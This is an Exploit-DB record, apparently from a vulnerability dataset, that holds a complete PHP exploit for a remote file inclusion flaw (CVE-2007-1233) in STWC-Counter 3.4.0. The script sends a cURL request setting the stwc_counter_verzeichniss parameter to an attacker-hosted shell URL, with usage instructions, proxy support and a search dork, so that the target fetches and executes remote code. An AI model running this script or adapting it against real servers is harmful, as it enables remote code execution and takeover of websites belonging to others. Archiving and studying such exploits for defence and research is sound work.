{
  "id": "3379",
  "title": "STWC-Counter 3.4.0 - &#039;downloadcounter.php&#039; Remote File Inclusion",
  "cve": "CVE-2007-1233",
  "vuln_type": "rce",
  "code": "<?php\r\n\r\n//File Inclusion Exploit for STWC-Counter <= 3.4.0.0\r\n//Found and Exploit Coded by burncycle - burncycle[(at)]robert-beran[(dot)]de\r\n//|\r\n//Vendor: http://www.stwc-counter.de/\r\n//Dork: www.stwc-counter.de\r\n//|\r\n//Bug in \"downloadcounter.php\":\r\n//..\r\n//$stwc_verzeichniss = $stwc_counter_verzeichniss;\r\n//..\r\n//include($stwc_verzeichniss . \"funktionen_intern.php\");\r\n//include($stwc_verzeichniss . \"einstellungen.php\");\r\n//include($stwc_verzeichniss . \"funktionen_ausgabe.php\");\r\n//..\r\n//include($stwc_verzeichniss . \"sprache/deutsch.php\");\r\n//..\r\n//include($stwc_verzeichniss . \"sprache/english.php\");\r\n//..\r\n//|\r\n//Usage: php exploit.php [pathtoscript] [pathtoshell] ([proxy:port])\r\n//Example: php exploit.php http://pathtoscript.com/counter/ http://pathtoshell.com/shell.txt? (localhost:8118)\r\n//|\r\n//Your Box Needs the cURL extension of PHP\r\n//The exploit works only with register_globals = On, allow_url_fopen = On and allow_url_include = On PHP settings on the target box\r\n//|\r\n//Edited 20.05.2007 by ensai (the same person as burncycle ;))\r\n//Added proxy support, working conditions supplemented and easier file inclusion statement\r\n\r\n//Nur ausnahme Fehler anzeigen\r\nerror_reporting(1);\r\n\r\necho \"Usage: php \".$_SERVER[\"argv\"][0].\" [pathtoscript] [pathtoshell] ([proxy:port])\\r\\n\\r\\n\";\r\necho \"Example: php \".$_SERVER[\"argv\"][0].\" http://pathtoscript.com/counter/ http://pathtoshell.com/shell.txt? (localhost:8118)\\r\\n\\r\\n\";\r\n\r\n//Schauen ob alles angegeben wurde\r\nif(!empty($_SERVER[\"argv\"][1]) && !empty($_SERVER[\"argv\"][2]))\r\n{\r\n\r\n  $pathtoscript = $_SERVER[\"argv\"][1];\r\n  $pathtoshell = $_SERVER[\"argv\"][2];\r\n\r\n  //erzeuge ein neues cURL Handle\r\n  $ch = curl_init();\r\n  \r\n  //proxy setzen\r\n  if (!empty($_SERVER['argv'][3]))\r\n  {\r\n    curl_setopt($ch, CURLOPT_PROXY, $_SERVER['argv'][3]);\r\n  }\r\n\r\n  //setzte die URL und andere Optionen\r\n  curl_setopt($ch, CURLOPT_URL, $pathtoscript.\"downloadcounter.php?stwc_counter_verzeichniss=\".$pathtoshell);\r\n  curl_setopt($ch, CURLOPT_HEADER, 0);\r\n\r\n  //f?hre die Aktion aus\r\n  curl_exec($ch);\r\n\r\n  //schlie?e das Handle und gebe Systemresourcen frei\r\n  curl_close($ch);\r\n\r\n}\r\n\r\n?>\r\n\r\n# milw0rm.com [2007-02-26]",
  "url": "https://www.exploit-db.com/exploits/3379"
}